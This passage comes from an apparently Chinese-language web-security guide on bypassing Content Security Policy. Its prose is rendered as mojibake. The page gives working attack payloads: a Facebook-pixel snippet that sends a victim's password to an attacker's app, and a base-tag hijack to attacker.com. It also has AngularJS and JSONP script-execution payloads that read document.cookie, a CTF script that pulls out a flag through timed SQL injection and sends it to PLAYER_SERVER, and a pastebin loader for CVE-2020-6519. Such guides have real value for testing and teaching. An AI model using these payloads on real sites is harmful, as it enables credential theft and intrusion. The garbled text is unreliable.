2. åˆ›å»ºä¸€ä¸ªæ–°çš„â€œFacebook ç™»å½•â€åº”ç”¨å¹¶é€‰æ‹©â€œç½‘ç«™â€ã€‚
3. è½¬åˆ°â€œè®¾ç½® -> åŸºæœ¬â€ï¼Œè·å–æ‚¨çš„â€œåº”ç”¨ IDâ€ã€‚
4. åœ¨æ‚¨æƒ³è¦æå–æ•°æ®çš„ç›®æ ‡ç½‘ç«™ä¸­ï¼Œæ‚¨å¯ä»¥é€šè¿‡â€œcustomEventâ€å’Œæ•°æ®è´Ÿè½½ç›´æ¥ä½¿ç”¨ Facebook SDK å°å·¥å…·â€œfbqâ€æ¥æå–æ•°æ®ã€‚
5. è½¬åˆ°æ‚¨çš„åº”ç”¨â€œäº‹ä»¶ç®¡ç†å™¨â€ï¼Œé€‰æ‹©æ‚¨åˆ›å»ºçš„åº”ç”¨ï¼ˆè¯·æ³¨æ„ï¼Œäº‹ä»¶ç®¡ç†å™¨å¯ä»¥åœ¨ç±»ä¼¼äºæ­¤çš„ URL ä¸­æ‰¾åˆ°ï¼šhttps://www.facebook.com/events\_manager2/list/pixel/\[app-id]/test\_eventsï¼‰ã€‚
6. é€‰æ‹©â€œæµ‹è¯•äº‹ä»¶â€é€‰é¡¹å¡ï¼Œä»¥æŸ¥çœ‹â€œæ‚¨çš„â€ç½‘ç«™å‘é€çš„äº‹ä»¶ã€‚

ç„¶åï¼Œåœ¨å—å®³è€…ä¸€ä¾§ï¼Œæ‚¨æ‰§è¡Œä»¥ä¸‹ä»£ç ä»¥åˆå§‹åŒ– Facebook è·Ÿè¸ªåƒç´ ï¼ŒæŒ‡å‘æ”»å‡»è€…çš„ Facebook å¼€å‘è€…å¸æˆ·åº”ç”¨ IDï¼Œå¹¶å‘å‡ºå¦‚ä¸‹è‡ªå®šä¹‰äº‹ä»¶ï¼š
```JavaScript
fbq('init', '1279785999289471');â€‹ // this number should be the App ID of the attacker's Meta/Facebook account
fbq('trackCustom', 'My-Custom-Event',{â€‹
data: "Leaked user password: '"+document.getElementById('user-password').innerText+"'"â€‹
});
```
å…³äºå‰è¡¨ä¸­æŒ‡å®šçš„å…¶ä»–ä¸ƒä¸ªç¬¬ä¸‰æ–¹åŸŸåï¼Œè¿˜æœ‰è®¸å¤šå…¶ä»–æ–¹æ³•å¯ä»¥æ»¥ç”¨å®ƒä»¬ã€‚æœ‰å…³å…¶ä»–ç¬¬ä¸‰æ–¹æ»¥ç”¨çš„æ›´å¤šè§£é‡Šï¼Œè¯·å‚é˜…ä¹‹å‰çš„ [blog post](https://sensepost.com/blog/2023/dress-codethe-talk/#bypasses)ã€‚

### é€šè¿‡ RPOï¼ˆç›¸å¯¹è·¯å¾„è¦†ç›–ï¼‰ç»•è¿‡ <a href="#bypass-via-rpo-relative-path-overwrite" id="bypass-via-rpo-relative-path-overwrite"></a>

é™¤äº†å‰é¢æåˆ°çš„é‡å®šå‘ä»¥ç»•è¿‡è·¯å¾„é™åˆ¶ï¼Œè¿˜æœ‰ä¸€ç§ç§°ä¸ºç›¸å¯¹è·¯å¾„è¦†ç›–ï¼ˆRPOï¼‰çš„æŠ€æœ¯å¯ä»¥åœ¨æŸäº›æœåŠ¡å™¨ä¸Šä½¿ç”¨ã€‚

ä¾‹å¦‚ï¼Œå¦‚æœ CSP å…è®¸è·¯å¾„ `https://example.com/scripts/react/`ï¼Œåˆ™å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼ç»•è¿‡ï¼š
```html
<script src="https://example.com/scripts/react/..%2fangular%2fangular.js"></script>
```
æµè§ˆå™¨æœ€ç»ˆå°†åŠ è½½ `https://example.com/scripts/angular/angular.js`ã€‚

è¿™ä¹‹æ‰€ä»¥æœ‰æ•ˆï¼Œæ˜¯å› ä¸ºå¯¹äºæµè§ˆå™¨æ¥è¯´ï¼Œæ‚¨æ­£åœ¨åŠ è½½ä¸€ä¸ªåä¸º `..%2fangular%2fangular.js` çš„æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶ä½äº `https://example.com/scripts/react/` ä¸‹ï¼Œè¿™ç¬¦åˆ CSPã€‚

âˆ‘ï¼Œå®ƒä»¬å°†è§£ç å®ƒï¼Œæœ‰æ•ˆåœ°è¯·æ±‚ `https://example.com/scripts/react/../angular/angular.js`ï¼Œè¿™ç­‰åŒäº `https://example.com/scripts/angular/angular.js`ã€‚

é€šè¿‡ **åˆ©ç”¨æµè§ˆå™¨å’ŒæœåŠ¡å™¨ä¹‹é—´ URL è§£é‡Šçš„ä¸ä¸€è‡´æ€§ï¼Œå¯ä»¥ç»•è¿‡è·¯å¾„è§„åˆ™**ã€‚

è§£å†³æ–¹æ¡ˆæ˜¯ç¡®ä¿æœåŠ¡å™¨ç«¯ä¸å°† `%2f` è§†ä¸º `/`ï¼Œä»¥ç¡®ä¿æµè§ˆå™¨å’ŒæœåŠ¡å™¨ä¹‹é—´çš„ä¸€è‡´è§£é‡Šï¼Œä»è€Œé¿å…æ­¤é—®é¢˜ã€‚

åœ¨çº¿ç¤ºä¾‹ï¼š[ ](https://jsbin.com/werevijewa/edit?html,output)[https://jsbin.com/werevijewa/edit?html,output](https://jsbin.com/werevijewa/edit?html,output)

### Iframes JS æ‰§è¡Œ

{% content-ref url="../xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
[iframes-in-xss-and-csp.md](../xss-cross-site-scripting/iframes-in-xss-and-csp.md)
{% endcontent-ref %}

### ç¼ºå°‘ **base-uri**

å¦‚æœç¼ºå°‘ **base-uri** æŒ‡ä»¤ï¼Œæ‚¨å¯ä»¥åˆ©ç”¨å®ƒæ‰§è¡Œ [**æ‚¬æŒ‚æ ‡è®°æ³¨å…¥**](../dangling-markup-html-scriptless-injection/)ã€‚

æ­¤å¤–ï¼Œå¦‚æœ **é¡µé¢ä½¿ç”¨ç›¸å¯¹è·¯å¾„åŠ è½½è„šæœ¬**ï¼ˆå¦‚ `<script src="/js/app.js">`ï¼‰å¹¶ä½¿ç”¨ **Nonce**ï¼Œæ‚¨å¯ä»¥åˆ©ç”¨ **base** **æ ‡ç­¾** ä½¿å…¶ **ä»æ‚¨è‡ªå·±çš„æœåŠ¡å™¨åŠ è½½** è„šæœ¬ï¼Œä»è€Œå®ç° **XSS**ã€‚\
å¦‚æœæ˜“å—æ”»å‡»çš„é¡µé¢æ˜¯é€šè¿‡ **httpS** åŠ è½½çš„ï¼Œè¯·åœ¨ base ä¸­ä½¿ç”¨ httpS URLã€‚
```html
<base href="https://www.attacker.com/">
```
### AngularJS äº‹ä»¶

ä¸€ç§ç‰¹å®šçš„ç­–ç•¥ç§°ä¸ºå†…å®¹å®‰å…¨ç­–ç•¥ï¼ˆCSPï¼‰ï¼Œå¯èƒ½ä¼šé™åˆ¶ JavaScript äº‹ä»¶ã€‚ç„¶è€Œï¼ŒAngularJS å¼•å…¥äº†è‡ªå®šä¹‰äº‹ä»¶ä½œä¸ºæ›¿ä»£ã€‚åœ¨äº‹ä»¶ä¸­ï¼ŒAngularJS æä¾›äº†ä¸€ä¸ªç‹¬ç‰¹çš„å¯¹è±¡ `$event`ï¼Œå¼•ç”¨åŸç”Ÿæµè§ˆå™¨äº‹ä»¶å¯¹è±¡ã€‚è¿™ä¸ª `$event` å¯¹è±¡å¯ä»¥è¢«åˆ©ç”¨æ¥è§„é¿ CSPã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œåœ¨ Chrome ä¸­ï¼Œ`$event/event` å¯¹è±¡å…·æœ‰ä¸€ä¸ª `path` å±æ€§ï¼ŒåŒ…å«ä¸€ä¸ªå¯¹è±¡æ•°ç»„ï¼Œæ¶‰åŠäº‹ä»¶çš„æ‰§è¡Œé“¾ï¼Œ`window` å¯¹è±¡å§‹ç»ˆä½äºæœ«å°¾ã€‚è¿™ä¸ªç»“æ„å¯¹äºæ²™ç®±é€ƒé€¸ç­–ç•¥è‡³å…³é‡è¦ã€‚

é€šè¿‡å°†è¿™ä¸ªæ•°ç»„ä¼ é€’ç»™ `orderBy` è¿‡æ»¤å™¨ï¼Œå¯ä»¥å¯¹å…¶è¿›è¡Œè¿­ä»£ï¼Œåˆ©ç”¨ç»ˆç«¯å…ƒç´ ï¼ˆ`window` å¯¹è±¡ï¼‰è§¦å‘åƒ `alert()` è¿™æ ·çš„å…¨å±€å‡½æ•°ã€‚ä¸‹é¢çš„ä»£ç ç‰‡æ®µé˜æ˜äº†è¿™ä¸ªè¿‡ç¨‹ï¼š
```xml
<input%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27>#x
?search=<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x
```
è¿™ä¸ªä»£ç ç‰‡æ®µçªå‡ºäº†ä½¿ç”¨ `ng-focus` æŒ‡ä»¤è§¦å‘äº‹ä»¶ï¼Œä½¿ç”¨ `$event.path|orderBy` æ¥æ“çºµ `path` æ•°ç»„ï¼Œå¹¶åˆ©ç”¨ `window` å¯¹è±¡æ‰§è¡Œ `alert()` å‡½æ•°ï¼Œä»è€Œæ­ç¤º `document.cookie`ã€‚

**åœ¨** [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) **ä¸­æŸ¥æ‰¾å…¶ä»– Angular ç»•è¿‡æ–¹æ³•**

### AngularJS å’Œç™½åå•åŸŸå
```
Content-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none' ;report-uri /Report-parsing-url;
```
ä¸€ä¸ªåœ¨ Angular JS åº”ç”¨ç¨‹åºä¸­ä¸ºè„šæœ¬åŠ è½½åˆ—å…¥ç™½åå•çš„ CSP ç­–ç•¥å¯ä»¥é€šè¿‡è°ƒç”¨å›è°ƒå‡½æ•°å’ŒæŸäº›æ˜“å—æ”»å‡»çš„ç±»æ¥ç»•è¿‡ã€‚æœ‰å…³æ­¤æŠ€æœ¯çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜…æ­¤ [git repository](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh\*t,-it's-CSP!%22) ä¸­çš„è¯¦ç»†æŒ‡å—ã€‚

æœ‰æ•ˆçš„æœ‰æ•ˆè½½è·ï¼š
```html
<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>
ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>

<!-- no longer working -->
<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)">
```
å…¶ä»– JSONP ä»»æ„æ‰§è¡Œç«¯ç‚¹å¯ä»¥åœ¨ [**è¿™é‡Œ**](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt) æ‰¾åˆ°ï¼ˆå…¶ä¸­ä¸€äº›å·²è¢«åˆ é™¤æˆ–ä¿®å¤ï¼‰

### é€šè¿‡é‡å®šå‘ç»•è¿‡

å½“ CSP é‡åˆ°æœåŠ¡å™¨ç«¯é‡å®šå‘æ—¶ä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿå¦‚æœé‡å®šå‘å¯¼è‡´åˆ°ä¸€ä¸ªä¸è¢«å…è®¸çš„ä¸åŒæºï¼Œå®ƒä»ç„¶ä¼šå¤±è´¥ã€‚

ç„¶è€Œï¼Œæ ¹æ® [CSP è§„èŒƒ 4.2.2.3. è·¯å¾„å’Œé‡å®šå‘](https://www.w3.org/TR/CSP2/#source-list-paths-and-redirects) ä¸­çš„æè¿°ï¼Œå¦‚æœé‡å®šå‘å¯¼è‡´åˆ°ä¸€ä¸ªä¸åŒçš„è·¯å¾„ï¼Œå®ƒå¯ä»¥ç»•è¿‡åŸå§‹é™åˆ¶ã€‚

è¿™æ˜¯ä¸€ä¸ªä¾‹å­ï¼š
```html
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Security-Policy" content="script-src http://localhost:5555 https://www.google.com/a/b/c/d">
</head>
<body>
<div id=userContent>
<script src="https://https://www.google.com/test"></script>
<script src="https://https://www.google.com/a/test"></script>
<script src="http://localhost:5555/301"></script>
</div>
</body>
</html>
```
å¦‚æœCSPè®¾ç½®ä¸º`https://www.google.com/a/b/c/d`ï¼Œç”±äºè·¯å¾„è¢«è€ƒè™‘ï¼Œ`/test`å’Œ`/a/test`è„šæœ¬å°†è¢«CSPé˜»æ­¢ã€‚

ç„¶è€Œï¼Œæœ€ç»ˆçš„`http://localhost:5555/301`å°†ä¼š**åœ¨æœåŠ¡å™¨ç«¯é‡å®šå‘åˆ°`https://www.google.com/complete/search?client=chrome&q=123&jsonp=alert(1)//`**ã€‚ç”±äºè¿™æ˜¯ä¸€ä¸ªé‡å®šå‘ï¼Œ**è·¯å¾„ä¸è¢«è€ƒè™‘**ï¼Œå› æ­¤**è„šæœ¬å¯ä»¥è¢«åŠ è½½**ï¼Œä»è€Œç»•è¿‡è·¯å¾„é™åˆ¶ã€‚

é€šè¿‡è¿™ä¸ªé‡å®šå‘ï¼Œå³ä½¿è·¯å¾„å®Œå…¨æŒ‡å®šï¼Œä»ç„¶ä¼šè¢«ç»•è¿‡ã€‚

å› æ­¤ï¼Œæœ€ä½³è§£å†³æ–¹æ¡ˆæ˜¯ç¡®ä¿ç½‘ç«™æ²¡æœ‰ä»»ä½•å¼€æ”¾é‡å®šå‘æ¼æ´ï¼Œå¹¶ä¸”CSPè§„åˆ™ä¸­æ²¡æœ‰å¯ä»¥è¢«åˆ©ç”¨çš„åŸŸåã€‚

### é€šè¿‡æ‚¬æŒ‚æ ‡è®°ç»•è¿‡CSP

é˜…è¯»[å¦‚ä½•åšåˆ°è¿™ä¸€ç‚¹](../dangling-markup-html-scriptless-injection/)ã€‚

### 'unsafe-inline'; img-src \*; é€šè¿‡XSS
```
default-src 'self' 'unsafe-inline'; img-src *;
```
`'unsafe-inline'` æ„å‘³ç€æ‚¨å¯ä»¥åœ¨ä»£ç ä¸­æ‰§è¡Œä»»ä½•è„šæœ¬ï¼ˆXSS å¯ä»¥æ‰§è¡Œä»£ç ï¼‰ï¼Œè€Œ `img-src *` æ„å‘³ç€æ‚¨å¯ä»¥åœ¨ç½‘é¡µä¸­ä½¿ç”¨æ¥è‡ªä»»ä½•èµ„æºçš„ä»»ä½•å›¾åƒã€‚

æ‚¨å¯ä»¥é€šè¿‡å›¾åƒæ³„éœ²æ•°æ®æ¥ç»•è¿‡æ­¤ CSPï¼ˆåœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒXSS æ»¥ç”¨ä¸€ä¸ª CSRFï¼Œå…¶ä¸­ä¸€ä¸ªå¯è¢«æœºå™¨äººè®¿é—®çš„é¡µé¢åŒ…å« SQLiï¼Œå¹¶é€šè¿‡å›¾åƒæå–æ ‡å¿—ï¼‰ï¼š
```javascript
<script>fetch('http://x-oracle-v0.nn9ed.ka0labs.org/admin/search/x%27%20union%20select%20flag%20from%20challenge%23').then(_=>_.text()).then(_=>new Image().src='http://PLAYER_SERVER/?'+_)</script>
```
From: [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

æ‚¨è¿˜å¯ä»¥åˆ©ç”¨æ­¤é…ç½®æ¥**åŠ è½½æ’å…¥åœ¨å›¾åƒä¸­çš„javascriptä»£ç **ã€‚ä¾‹å¦‚ï¼Œå¦‚æœé¡µé¢å…è®¸ä»TwitteråŠ è½½å›¾åƒã€‚æ‚¨å¯ä»¥**åˆ¶ä½œ**ä¸€ä¸ª**ç‰¹æ®Šå›¾åƒ**ï¼Œ**ä¸Šä¼ **åˆ°Twitterï¼Œå¹¶åˆ©ç”¨â€œ**unsafe-inline**â€æ¥**æ‰§è¡Œ**JSä»£ç ï¼ˆä½œä¸ºå¸¸è§„XSSï¼‰ï¼Œè¯¥ä»£ç å°†**åŠ è½½**è¯¥**å›¾åƒ**ï¼Œ**æå–**å…¶ä¸­çš„**JS**å¹¶**æ‰§è¡Œ**å®ƒï¼š[https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/](https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/)

### With Service Workers

Service workers **`importScripts`** å‡½æ•°ä¸å—CSPé™åˆ¶ï¼š

{% content-ref url="../xss-cross-site-scripting/abusing-service-workers.md" %}
[abusing-service-workers.md](../xss-cross-site-scripting/abusing-service-workers.md)
{% endcontent-ref %}

### Policy Injection

**ç ”ç©¶ï¼š** [**https://portswigger.net/research/bypassing-csp-with-policy-injection**](https://portswigger.net/research/bypassing-csp-with-policy-injection)

#### Chrome

å¦‚æœæ‚¨å‘é€çš„**å‚æ•°**è¢«**ç²˜è´´åœ¨** **æ”¿ç­–çš„å£°æ˜**ä¸­ï¼Œé‚£ä¹ˆæ‚¨å¯ä»¥ä»¥æŸç§æ–¹å¼**æ›´æ”¹**è¯¥**æ”¿ç­–**ï¼Œä½¿å…¶**æ— æ•ˆ**ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹ä»»ä½•ç»•è¿‡æ–¹æ³•**å…è®¸è„šæœ¬ 'unsafe-inline'**ï¼š
```bash
script-src-elem *; script-src-attr *
script-src-elem 'unsafe-inline'; script-src-attr 'unsafe-inline'
```
å› ä¸ºè¿™ä¸ªæŒ‡ä»¤ä¼š**è¦†ç›–ç°æœ‰çš„ script-src æŒ‡ä»¤**ã€‚\
ä½ å¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ°ä¸€ä¸ªä¾‹å­: [http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E)

#### Edge

åœ¨ Edge ä¸­è¦ç®€å•å¾—å¤šã€‚å¦‚æœä½ å¯ä»¥åœ¨ CSP ä¸­æ·»åŠ è¿™ä¸ª: **`;_`** **Edge** ä¼š**ä¸¢å¼ƒ**æ•´ä¸ª**ç­–ç•¥**ã€‚\
ä¾‹å­: [http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert(1)%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert\(1\)%3C/script%3E)

### img-src \*; é€šè¿‡ XSS (iframe) - æ—¶é—´æ”»å‡»

æ³¨æ„ç¼ºå°‘æŒ‡ä»¤ `'unsafe-inline'`\
è¿™æ¬¡ä½ å¯ä»¥è®©å—å®³è€…é€šè¿‡ **XSS** ä½¿ç”¨ä¸€ä¸ª `<iframe` åŠ è½½ä¸€ä¸ªåœ¨**ä½ æ§åˆ¶**ä¸‹çš„é¡µé¢ã€‚è¿™æ¬¡ä½ å°†è®©å—å®³è€…è®¿é—®ä½ æƒ³è¦æå–ä¿¡æ¯çš„é¡µé¢ï¼ˆ**CSRF**ï¼‰ã€‚ä½ æ— æ³•è®¿é—®é¡µé¢çš„å†…å®¹ï¼Œä½†å¦‚æœä½ èƒ½**æ§åˆ¶é¡µé¢åŠ è½½æ‰€éœ€çš„æ—¶é—´**ï¼Œä½ å°±å¯ä»¥æå–æ‰€éœ€çš„ä¿¡æ¯ã€‚

è¿™æ¬¡å°†æå–ä¸€ä¸ª**æ ‡å¿—**ï¼Œæ¯å½“é€šè¿‡ SQLi **æ­£ç¡®çŒœæµ‹ä¸€ä¸ªå­—ç¬¦**æ—¶ï¼Œ**å“åº”**ç”±äº sleep å‡½æ•°ä¼š**èŠ±è´¹æ›´å¤šæ—¶é—´**ã€‚ç„¶åï¼Œä½ å°†èƒ½å¤Ÿæå–æ ‡å¿—:
```html
<!--code from https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle -->
<iframe name=f id=g></iframe> // The bot will load an URL with the payload
<script>
let host = "http://x-oracle-v1.nn9ed.ka0labs.org";
function gen(x) {
x = escape(x.replace(/_/g, '\\_'));
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag%20like%20'${x}%25'and%201=sleep(0.1)%23`;
}

function gen2(x) {
x = escape(x);
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag='${x}'and%201=sleep(0.1)%23`;
}

async function query(word, end=false) {
let h = performance.now();
f.location = (end ? gen2(word) : gen(word));
await new Promise(r => {
g.onload = r;
});
let diff = performance.now() - h;
return diff > 300;
}

let alphabet = '_abcdefghijklmnopqrstuvwxyz0123456789'.split('');
let postfix = '}'

async function run() {
let prefix = 'nn9ed{';
while (true) {
let i = 0;
for (i;i<alphabet.length;i++) {
let c = alphabet[i];
let t =  await query(prefix+c); // Check what chars returns TRUE or FALSE
console.log(prefix, c, t);
if (t) {
console.log('FOUND!')
prefix += c;
break;
}
}
if (i==alphabet.length) {
console.log('missing chars');
break;
}
let t = await query(prefix+'}', true);
if (t) {
prefix += '}';
break;
}
}
new Image().src = 'http://PLAYER_SERVER/?' + prefix; //Exfiltrate the flag
console.log(prefix);
}

run();
</script>
```
### é€šè¿‡ä¹¦ç­¾å°å·¥å…·

æ­¤æ”»å‡»å°†æ¶‰åŠä¸€äº›ç¤¾ä¼šå·¥ç¨‹å­¦ï¼Œæ”»å‡»è€…**è¯´æœç”¨æˆ·å°†é“¾æ¥æ‹–æ”¾åˆ°æµè§ˆå™¨çš„ä¹¦ç­¾å°å·¥å…·ä¸Š**ã€‚æ­¤ä¹¦ç­¾å°å·¥å…·å°†åŒ…å«**æ¶æ„çš„javascript**ä»£ç ï¼Œå½“æ‹–æ”¾æˆ–ç‚¹å‡»æ—¶ï¼Œå°†åœ¨å½“å‰ç½‘é¡µçª—å£çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œï¼Œ**ç»•è¿‡CSPå¹¶å…è®¸çªƒå–æ•æ„Ÿä¿¡æ¯**ï¼Œä¾‹å¦‚cookiesæˆ–tokensã€‚

æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·[**æŸ¥çœ‹åŸå§‹æŠ¥å‘Š**](https://socradar.io/csp-bypass-unveiled-the-hidden-threat-of-bookmarklets/)ã€‚

### é€šè¿‡é™åˆ¶CSPç»•è¿‡CSP

åœ¨[**è¿™ä¸ªCTFå†™ä½œ**](https://github.com/google/google-ctf/tree/master/2023/web-biohazard/solution)ä¸­ï¼ŒCSPé€šè¿‡åœ¨å…è®¸çš„iframeä¸­æ³¨å…¥æ›´ä¸¥æ ¼çš„CSPæ¥ç»•è¿‡ï¼Œè¯¥CSPä¸å…è®¸åŠ è½½ç‰¹å®šçš„JSæ–‡ä»¶ï¼Œç„¶åé€šè¿‡**åŸå‹æ±¡æŸ“**æˆ–**DOMè¦†ç›–**å…è®¸**æ»¥ç”¨ä¸åŒçš„è„šæœ¬æ¥åŠ è½½ä»»æ„è„šæœ¬**ã€‚

æ‚¨å¯ä»¥ä½¿ç”¨**`csp`**å±æ€§**é™åˆ¶iframeçš„CSP**ï¼š

{% code overflow="wrap" %}
```html
<iframe src="https://biohazard-web.2023.ctfcompetition.com/view/[bio_id]" csp="script-src https://biohazard-web.2023.ctfcompetition.com/static/closure-library/ https://biohazard-web.2023.ctfcompetition.com/static/sanitizer.js https://biohazard-web.2023.ctfcompetition.com/static/main.js 'unsafe-inline' 'unsafe-eval'"></iframe>
```
{% endcode %}

åœ¨[**è¿™ä¸ªCTFå†™ä½œ**](https://github.com/aszx87410/ctf-writeups/issues/48)ä¸­ï¼Œé€šè¿‡**HTMLæ³¨å…¥**å¯ä»¥**è¿›ä¸€æ­¥é™åˆ¶**ä¸€ä¸ª**CSP**ï¼Œä»è€Œç¦ç”¨é˜²æ­¢CSTIçš„è„šæœ¬ï¼Œå› æ­¤**æ¼æ´å˜å¾—å¯åˆ©ç”¨ã€‚**\
å¯ä»¥ä½¿ç”¨**HTMLå…ƒæ ‡ç­¾**ä½¿CSPå˜å¾—æ›´åŠ ä¸¥æ ¼ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡**ç§»é™¤**å…è®¸å…¶**nonce**çš„**å…¥å£**æ¥ç¦ç”¨å†…è”è„šæœ¬ï¼Œå¹¶é€šè¿‡sha**å¯ç”¨ç‰¹å®šçš„å†…è”è„šæœ¬**ï¼š
```html
<meta http-equiv="Content-Security-Policy" content="script-src 'self'
'unsafe-eval' 'strict-dynamic'
'sha256-whKF34SmFOTPK4jfYDy03Ea8zOwJvqmz%2boz%2bCtD7RE4='
'sha256-Tz/iYFTnNe0de6izIdG%2bo6Xitl18uZfQWapSbxHE6Ic=';">
```
### JS exfiltration with Content-Security-Policy-Report-Only

å¦‚æœä½ èƒ½è®©æœåŠ¡å™¨å“åº”å¸¦æœ‰ **`Content-Security-Policy-Report-Only`** å¤´éƒ¨ä¸” **å€¼ç”±ä½ æ§åˆ¶**ï¼ˆå¯èƒ½æ˜¯å› ä¸º CRLFï¼‰ï¼Œä½ å¯ä»¥è®©å®ƒæŒ‡å‘ä½ çš„æœåŠ¡å™¨ï¼Œå¹¶ä¸”å¦‚æœä½  **åŒ…è£¹** ä½ æƒ³è¦æ³„éœ²çš„ **JS å†…å®¹** ä½¿ç”¨ **`<script>`**ï¼Œå¹¶ä¸”å› ä¸º CSP å¾ˆå¯èƒ½ä¸å…è®¸ `unsafe-inline`ï¼Œè¿™å°† **è§¦å‘ CSP é”™è¯¯**ï¼Œå¹¶ä¸”éƒ¨åˆ†è„šæœ¬ï¼ˆåŒ…å«æ•æ„Ÿä¿¡æ¯ï¼‰å°†ä» `Content-Security-Policy-Report-Only` å‘é€åˆ°æœåŠ¡å™¨ã€‚

å¯¹äºä¸€ä¸ªä¾‹å­ [**æŸ¥çœ‹è¿™ä¸ª CTF æ–‡ç« **](https://github.com/maple3142/My-CTF-Challenges/tree/master/TSJ%20CTF%202022/Nim%20Notes)ã€‚

### [CVE-2020-6519](https://www.perimeterx.com/tech-blog/2020/csp-bypass-vuln-disclosure/)
```javascript
document.querySelector('DIV').innerHTML="<iframe src='javascript:var s = document.createElement(\"script\");s.src = \"https://pastebin.com/raw/dw5cWGK6\";document.body.appendChild(s);'></iframe>";
```
### é€šè¿‡CSPå’ŒIframeæ³„éœ²ä¿¡æ¯

* åˆ›å»ºä¸€ä¸ªæŒ‡å‘ä¸€ä¸ªURLçš„`iframe`ï¼ˆæˆ‘ä»¬ç§°ä¹‹ä¸º`https://example.redirect.com`ï¼‰ï¼Œè¯¥URLè¢«CSPå…è®¸ã€‚
* è¯¥URLéšåé‡å®šå‘åˆ°ä¸€ä¸ªç§˜å¯†URLï¼ˆä¾‹å¦‚ï¼Œ`https://usersecret.example2.com`ï¼‰ï¼Œè¯¥URL **ä¸è¢«** CSPå…è®¸ã€‚
* é€šè¿‡ç›‘å¬`securitypolicyviolation`äº‹ä»¶ï¼Œå¯ä»¥æ•è·`blockedURI`å±æ€§ã€‚è¯¥å±æ€§æ­ç¤ºäº†è¢«é˜»æ­¢çš„URIçš„åŸŸåï¼Œä»è€Œæ³„éœ²äº†åˆå§‹URLé‡å®šå‘çš„ç§˜å¯†åŸŸåã€‚

æœ‰è¶£çš„æ˜¯ï¼ŒåƒChromeå’ŒFirefoxè¿™æ ·çš„æµè§ˆå™¨åœ¨å¤„ç†ä¸CSPç›¸å…³çš„iframesæ—¶è¡¨ç°ä¸åŒï¼Œå¯èƒ½å¯¼è‡´ç”±äºæœªå®šä¹‰è¡Œä¸ºè€Œæ³„éœ²æ•æ„Ÿä¿¡æ¯ã€‚

å¦ä¸€ç§æŠ€æœ¯æ¶‰åŠåˆ©ç”¨CSPæœ¬èº«æ¨æ–­ç§˜å¯†å­åŸŸåã€‚è¯¥æ–¹æ³•ä¾èµ–äºäºŒåˆ†æœç´¢ç®—æ³•ï¼Œå¹¶è°ƒæ•´CSPä»¥åŒ…å«æ•…æ„è¢«é˜»æ­¢çš„ç‰¹å®šåŸŸåã€‚ä¾‹å¦‚ï¼Œå¦‚æœç§˜å¯†å­åŸŸåç”±æœªçŸ¥å­—ç¬¦ç»„æˆï¼Œå¯ä»¥é€šè¿‡ä¿®æ”¹CSPæŒ‡ä»¤æ¥é˜»æ­¢æˆ–å…è®¸è¿™äº›å­åŸŸåï¼Œé€æ­¥æµ‹è¯•ä¸åŒçš„å­åŸŸåã€‚ä»¥ä¸‹æ˜¯ä¸€ä¸ªç‰‡æ®µï¼Œå±•ç¤ºäº†å¦‚ä½•è®¾ç½®CSPä»¥ä¿ƒè¿›æ­¤æ–¹æ³•ï¼š
```markdown
img-src https://chall.secdriven.dev https://doc-1-3213.secdrivencontent.dev https://doc-2-3213.secdrivencontent.dev ... https://doc-17-3213.secdriven.dev
```
é€šè¿‡ç›‘æ§å“ªäº›è¯·æ±‚è¢«CSPé˜»æ­¢æˆ–å…è®¸ï¼Œå¯ä»¥ç¼©å°ç§˜å¯†å­åŸŸåä¸­å¯èƒ½çš„å­—ç¬¦ï¼Œæœ€ç»ˆæ­ç¤ºå®Œæ•´çš„URLã€‚

è¿™ä¸¤ç§æ–¹æ³•åˆ©ç”¨äº†CSPåœ¨æµè§ˆå™¨ä¸­çš„å®ç°å’Œè¡Œä¸ºçš„ç»†å¾®å·®åˆ«ï¼Œå±•ç¤ºäº†çœ‹ä¼¼å®‰å…¨çš„ç­–ç•¥å¦‚ä½•æ— æ„ä¸­æ³„éœ²æ•æ„Ÿä¿¡æ¯ã€‚

æ¥è‡ª[**è¿™é‡Œ**](https://ctftime.org/writeup/29310)çš„æŠ€å·§ã€‚

